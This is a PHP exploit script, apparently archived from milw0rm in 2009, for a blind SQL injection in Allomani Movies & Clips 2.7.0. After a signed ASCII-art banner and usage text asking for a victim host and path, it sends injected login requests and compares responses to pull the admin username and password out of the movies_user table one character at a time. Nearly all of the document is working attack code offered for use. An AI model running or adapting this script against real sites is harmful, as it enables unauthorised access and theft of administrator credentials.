<html><head><title>Allomani Movies & Clips 2.7.0 Remote Blind SQL Injection Exploit</title></head><pre>&lt;?php
ini_set(&quot;max_execution_time&quot;,0);
print_r('
                                       ||          ||   | ||
                                o_,_7 _||  . _o_7 _|| q_|_||  o_///_,
                               (  :  /    (_)    /           (      .

                                        ___________________
                                      _/QQQQQQQQQQQQQQQQQQQ\__
[q] Allomani movies &amp; Clips v2.7.0  __/QQQ/````````````````\QQQ\___
  Blind SQL inj. exploit         _/QQQQQ/                  \QQQQQQ\
[q] _GET   &lt;3                   /QQQQ/``                    ```QQQQ\
                               /QQQQ/                          \QQQQ\
[q] http://allomani.com       |QQQQ/    By  Qabandi             \QQQQ|
                              |QQQQ|                            |QQQQ|
                              |QQQQ|    From Kuwait, PEACE...   |QQQQ|
                              |QQQQ|                            |QQQQ|
                              |QQQQ\       iqa[a]hotmail.fr     /QQQQ|
[/]   -[hai]-                  \QQQQ\                      __  /QQQQ/
                                \QQQQ\                    /QQ\_QQQQ/
                                 \QQQQ\                   \QQQQQQQ/
                                  \QQQQQ\                 /QQQQQ/_
                                   ``\QQQQQ\_____________/QQQ/\QQQQ\_
                                      ``\QQQQQQQQQQQQQQQQQQQ/  `\QQQQ\
                                         ```````````````````     `````
 ______________________________________________________________________________
/                                                                              \
|                 I%00Dont%00Care...                                           |
\______________________________________________________________________________/
                                \ No More Private /
                                 `````````````````
');

if ($argc&lt;3) {
print_r('
-----------------------------------------------------------------------------
Usage:   php '.$argv[0].' VICTIM DIR

example: php '.$argv[0].' EXAMPLE /demo/

or if in root dir:
example: php '.$argv[0].' EXAMPLE //

-----------------------------------------------------------------------------
');
die;
}


 function QABANDI($victim,$vic_dir,$inj){
$host = $victim;
$p = &quot;http://&quot;.$host.$vic_dir;
$inj = urlencode($inj);

          $packet =&quot;GET &quot;.$p.&quot;/login.php?action=login&amp;username=&quot;.$inj.&quot;&amp;password=ass HTTP/1.1\r\n&quot;;
          $packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
          $packet.=&quot;Pragma: no-cache\r\n&quot;;
          $packet.=&quot;Host: &quot;.$victim.&quot;\r\n&quot;;
          $packet.=&quot;Connection: Close\r\n\r\n&quot;;

           //echo $packet;
	$o = @fsockopen($host, 80);
	if(!$o){
		echo &quot;\n[x] No response...\n&quot;;
		die;
	}
	
	fputs($o, $packet);
	while (!feof($o)) $data .= fread($o, 1024);
	fclose($o);
	
	$_404 = strstr( $data, &quot;HTTP/1.1 404 Not Found&quot; );
	if ( !empty($_404) ){
		echo &quot;\n[x] 404 Not Found... Make sure of path. \n&quot;;
		die;
	}

                                           return $data;

 } 
  function QAB_GET($from){
$content = $from;
preg_match_all(&quot;/&lt;center&gt;([^&lt;]+)&lt;\/center&gt;/&quot;,
    $content,
    $out, PREG_PATTERN_ORDER);

return  base64_encode($out[1][0]);
 }

$host1 = $argv[1];
$userdir1=$argv[2];

$truths = QAB_GET(QABANDI($host1,$userdir1,&quot;' or 1='1&quot;));
$falses = QAB_GET(QABANDI($host1,$userdir1,&quot;' or 1='2&quot;));

if($truths == $falses){
  echo &quot;Magic Quotes is on, exploit failed\n&quot;;
  die;
}
echo &quot;\n[q]Getting Admin User and Pass&quot;;
echo &quot;\n username: &quot;;

for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select username from movies_user limit 0,1),1,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}
      for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select username from movies_user limit 0,1),2,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}
           for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select username from movies_user limit 0,1),3,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}
                   for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select username from movies_user limit 0,1),4,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}

                          for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select username from movies_user limit 0,1),5,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}
                                for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select username from movies_user limit 0,1),6,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}
                                           for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select username from movies_user limit 0,1),7,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}

                      for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select username from movies_user limit 0,1),8,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}



echo &quot;\n password: &quot;;

for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select password from movies_user limit 0,1),1,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}
      for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select password from movies_user limit 0,1),2,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}
           for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select password from movies_user limit 0,1),3,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}
                   for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select password from movies_user limit 0,1),4,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}

                          for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select password from movies_user limit 0,1),5,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}
                                for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select password from movies_user limit 0,1),6,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}
                                           for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select password from movies_user limit 0,1),7,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}

                      for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select password from movies_user limit 0,1),8,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}

                             for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select password from movies_user limit 0,1),9,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}
                                 for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select password from movies_user limit 0,1),10,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}
                                      for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select password from movies_user limit 0,1),11,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}
                                          for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select password from movies_user limit 0,1),12,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}
                                              for ($i = 1; $i &lt;= 122; $i++) {
       $qest = QAB_GET(QABANDI($host1,$userdir1,&quot;' or ascii(substring((select password from movies_user limit 0,1),13,1))='&quot;.$i));
      if ($qest == $truths) {
  echo chr($i);
      }
}

echo &quot;\n\n this exploit is made to give you the first 8 chars of username and first 13 of password&quot;;

?&gt;

# milw0rm.com [2009-07-27]</pre></html>